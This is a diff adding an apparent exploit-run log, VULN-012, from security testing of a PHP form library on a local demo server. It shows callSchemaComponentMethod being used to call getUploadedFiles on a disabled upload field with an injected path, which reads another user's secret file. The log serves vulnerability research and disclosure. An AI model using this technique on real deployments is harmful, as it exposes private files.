@@ -1,0 +1,14 @@
+========================================================================
+VULN-012: callSchemaComponentMethod ignores disabled() → exposed method on disabled field
+========================================================================
+[INFO] target: http://localhost:21890
+[INFO] exercising: InteractsWithSchemas::callSchemaComponentMethod — no isDisabled() guard
+[SETUP] adding a standard ->disabled() FileUpload to the demo (harness: the finding needs a disabled field; this uses the documented ->disabled() feature, reverted after)
+[INFO] field 'fileUploadDisabled' rendered with disabled attribute: True
+[STEP] calling callSchemaComponentMethod('form.fileUploadDisabled','getUploadedFiles') on the DISABLED field with an injected path (field in state: True)
+[INFO] returns: [{"inj": {"name": "secret-0aeb9127.txt", "size": 70, "type": "text/plain", "url": "http://localhost:21890/storage/disabled-victim-0aeb9127/secret-0aeb9127.txt"}}]
+[PROOF] disabled field STILL returned metadata/URL: size=70 url=http://localhost:21890/storage/disabled-victim-0aeb9127/secret-0aeb9127.txt — isDisabled() not enforced for exposed methods
+[PROOF] fetched the URL → HTTP 200; victim content read: True
+[OK] exploit confirmed — the schema dispatcher invoked an exposed read method on a ->disabled() field (the table dispatcher guards this; the schema one does not)
+==> VULN-012: CONFIRMED — callSchemaComponentMethod invokes #[ExposedLivewireMethod] on ->disabled() fields (no isDisabled() guard) → VULN-004 oracle reachable on disabled fields
+[SETUP] reverted the harness disabled field; demo restored to pristine
